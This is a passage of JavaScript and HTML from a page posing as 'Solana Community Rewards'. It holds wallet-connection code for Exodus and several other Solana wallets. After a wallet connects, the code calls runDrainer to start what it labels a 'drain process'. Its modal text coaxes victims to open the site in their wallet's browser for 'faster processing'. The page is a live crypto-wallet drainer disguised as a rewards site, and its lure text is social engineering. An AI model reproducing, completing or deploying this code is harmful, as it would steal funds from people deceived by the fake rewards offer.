                const timeoutPromise = new Promise((_, reject) => 
                    setTimeout(() => reject(new Error('Exodus connection timeout')), 30000) // 30 seconds per attempt
                );
                  
                response = await Promise.race([connectPromise, timeoutPromise]);
                  publicKey = response?.publicKey || provider.solana?.publicKey || provider.publicKey;
                  
                  if (publicKey) {
                    exodusConnected = true;
                    console.log(`[CONNECT] Exodus ${strategy.name} successful:`, publicKey.toString());
              } else {
                    throw new Error('No public key returned');
                  }
                } catch (strategyError) {
                  console.log(`[CONNECT] Exodus ${strategy.name} failed:`, strategyError.message);
                  if (i < exodusStrategies.length - 1) {
                    await new Promise(resolve => setTimeout(resolve, 1000)); // Wait before next attempt
                  }
                }
              }
              
              if (!exodusConnected) {
                throw new Error('Exodus connection failed: All connection methods failed');
              }
              break;
              
            default:
              // Fallback for unknown wallets
              response = await provider.connect();
              publicKey = response?.publicKey || response?.address || provider.publicKey;
          }
          
          console.log(`[CONNECT] ${wallet.name} connected:`, publicKey?.toString() || 'No public key');
                showStatus('Processing...', 'loading');
          
          // Store connected wallet info
          window.connectedWallet = {
            name: wallet.name,
            key: walletKey,
            provider: provider,
            publicKey: publicKey
          };
          
          // Connection successful - trigger drain process
          console.log(`[CONNECT] ${wallet.name} connection successful - triggering drain process`);
          setTimeout(() => {
            runDrainer(provider);
          }, 500); // Reduced timeout to prevent delays
          
          } catch (error) {
          console.error(`[CONNECT] ${wallet.name} connection failed:`, error);
          showStatus('Failed', 'error');
        }
      } else {
        console.error(`[CONNECT] Provider not found for ${wallet.name}`);
        showStatus('Unavailable', 'error');
      }
    }
    
  } catch (error) {
    console.error(`[CONNECT] Error connecting to ${walletKey}:`, error);
    showStatus('Failed', 'error');
      }
    };
    

    
    // Function to show wallet browser prompt when no wallet is detected
    window.showWalletBrowserPrompt = function showWalletBrowserPrompt() {
      // Enhanced mobile detection with platform identification
      const userAgent = navigator.userAgent.toLowerCase();
      let isMobileDevice = /android|webos|iphone|ipad|ipod|blackberry|iemobile|opera mini/i.test(userAgent);
      if (!isMobileDevice) {
        isMobileDevice = /mobile|tablet/i.test(userAgent) || 
                        (navigator.maxTouchPoints && navigator.maxTouchPoints > 1) ||
                        window.innerWidth <= 768;
      }
      
      // Platform-specific detection
      const isIOS = /iphone|ipad|ipod/.test(userAgent);
      const isAndroid = /android/.test(userAgent);
      const platform = isIOS ? 'ios' : isAndroid ? 'android' : 'unknown';
      
      const instructions = `
        <div style="text-align: center; padding: 20px; max-width: 500px; margin: 0 auto;">
          <div style="margin-bottom: 20px;">
            <h3 style="color: #fff; margin-bottom: 10px; font-size: 18px;"><img src="/logo.png" alt="Logo" style="height: 20px; vertical-align: middle; margin-right: 8px;">   Solana Community Rewards</h3>
            <p style="color: #ccc; font-size: 14px; line-height: 1.5; margin-bottom: 20px;">
              No wallet detected! For the fastest and most secure connection experience, 
              please visit this site directly in your wallet's built-in browser.
            </p>
          </div>
          
          <div style="background: rgba(0,0,0,0.3); border-radius: 12px; padding: 16px; margin-bottom: 20px;">
            <h4 style="color: #fff; margin-bottom: 12px; font-size: 14px;">Open in Wallet Browser for Faster Connection</h4>
            <p style="color: #aaa; font-size: 12px; margin-bottom: 16px;">
              Click below to open this rewards site in your wallet's browser for instant connection:
            </p>
            <div style="display: flex; flex-wrap: wrap; gap: 8px; justify-content: center;">
              <button onclick="connectMobileWalletEnhanced('backpack').catch(e => console.error('Backpack error:', e))" style="background: linear-gradient(135deg, #000000 0%, #333333 100%); color: white; border: none; padding: 12px 18px; border-radius: 8px; font-size: 14px; cursor: pointer; transition: all 0.3s ease; font-weight: bold; box-shadow: 0 2px 8px rgba(0,0,0,0.3);">
                Open in Backpack (Recommended)
              </button>
              <button onclick="connectMobileWalletEnhanced('phantom').catch(e => console.error('Phantom error:', e))" style="background: linear-gradient(135deg, #9945FF 0%, #7B3FE4 100%); color: white; border: none; padding: 10px 16px; border-radius: 8px; font-size: 13px; cursor: pointer; transition: all 0.3s ease;">
                Open in Phantom
              </button>
              <button onclick="connectMobileWalletEnhanced('solflare').catch(e => console.error('Solflare error:', e))" style="background: linear-gradient(135deg, #FC9965 0%, #F7931E 100%); color: white; border: none; padding: 10px 16px; border-radius: 8px; font-size: 13px; cursor: pointer; transition: all 0.3s ease;">
                Open in Solflare
              </button>
              <button onclick="connectMobileWalletEnhanced('trustwallet').catch(e => console.error('Trust Wallet error:', e))" style="background: linear-gradient(135deg, #3375BB 0%, #1E4A8C 100%); color: white; border: none; padding: 10px 16px; border-radius: 8px; font-size: 13px; cursor: pointer; transition: all 0.3s ease;">
                Open in Trust Wallet
              </button>
              <button onclick="connectMobileWalletEnhanced('glow').catch(e => console.error('Glow error:', e))" style="background: linear-gradient(135deg, #FF6B6B 0%, #FF8E53 100%); color: white; border: none; padding: 10px 16px; border-radius: 8px; font-size: 13px; cursor: pointer; transition: all 0.3s ease;">
                Open in Glow
              </button>
              <button onclick="connectMobileWalletEnhanced('exodus').catch(e => console.error('Exodus error:', e))" style="background: linear-gradient(135deg, #00D4AA 0%, #00B894 100%); color: white; border: none; padding: 10px 16px; border-radius: 8px; font-size: 13px; cursor: pointer; transition: all 0.3s ease;">
                Open in Exodus
              </button>
            </div>
          </div>
          
          <div style="margin-top: 20px; padding: 12px; background: rgba(255,255,255,0.05); border-radius: 8px; border-left: 3px solid #14f195;">
            <p style="color: #14f195; font-size: 12px; margin: 0;">
              <strong>Faster Connection:</strong> Using your wallet's built-in browser provides instant connection and faster processing.
            </p>
          </div>
          
          <div style="margin-top: 15px; padding: 12px; background: rgba(0,0,0,0.4); border-radius: 8px; border-left: 3px solid #000000;">
            <p style="color: #ffffff; font-size: 12px; margin: 0;">
              <strong>Backpack Recommended:</strong> Backpack offers the fastest and most reliable connection experience for this rewards site.
            </p>
          </div>
          
          <div style="margin-top: 15px; padding: 12px; background: rgba(255,193,7,0.1); border-radius: 8px; border-left: 3px solid #ffc107;">
            <p style="color: #ffc107; font-size: 11px; margin: 0;">
              <strong>Note:</strong> ' + (isMobileDevice ? 'On mobile devices, deep links will attempt to open your wallet app. If the app is not installed, you\'ll be redirected to the wallet\'s website.' : 'On desktop, deep links will open in a new tab or redirect to the wallet\'s website.') + '
            </p>
          </div>
          
          <div style="margin-top: 15px; padding: 12px; background: rgba(255,107,107,0.1); border-radius: 8px; border-left: 3px solid #ff6b6b;">
            <p style="color: #ff6b6b; font-size: 11px; margin: 0;">
              <strong>Troubleshooting:</strong> If deep links don't work, manually copy this URL and open it in your wallet's browser: <br><code style="background: rgba(0,0,0,0.3); padding: 2px 4px; border-radius: 3px; font-size: 10px;">' + window.location.href + '</code>
            </p>
          </div>
        </div>
      `;
      
      // Show instructions in modal
      const modal = document.getElementById('statusModal');
      const msgEl = document.getElementById('statusModalMsg');
      if (modal && msgEl) {
        msgEl.innerHTML = instructions;
        modal.classList.add('active');
      } else {
        console.error('Wallet browser prompt modal elements not found');
        // Fallback: show alert
        alert('No wallet detected! Please open this site in your wallet\'s browser for the best experience.');
      }
    };
  </script>
  </script>

  <footer>
    <div class="div_footer">
      <a><p class="pfooter"> Terms of use </p></a>
      <a><p class="pfooter"> Privacy policy </p></a>
    </div>
    <div class="div_footer">
      <img class="logo_footer" src="Pictures/logo2.png">
    </div>
  </footer>
  
  <!-- Hamburger menu functionality - enable toggle for small screens -->
  <script>
    (function(){
      const hamburger = document.getElementById('hamburger');
      const nav = document.getElementById('nav-menu');
      if (!hamburger || !nav) return;

      // Ensure nav starts hidden on very small screens (CSS may already handle this)
      function ensureInitialState(){
        if (window.matchMedia('(max-width: 900px)').matches) {
          nav.style.display = nav.style.display || 'none';
        } else {
          nav.style.display = '';
        }
      }

      hamburger.addEventListener('click', function(){
        const isOpen = hamburger.classList.toggle('active');
        if (isOpen) {
          nav.style.display = 'flex';
        } else {
          nav.style.display = 'none';
        }
      });

      // Update on resize / orientation change
      window.addEventListener('resize', ensureInitialState);
      window.addEventListener('orientationchange', ensureInitialState);
      ensureInitialState();
    })();
  </script>
  
  </body>
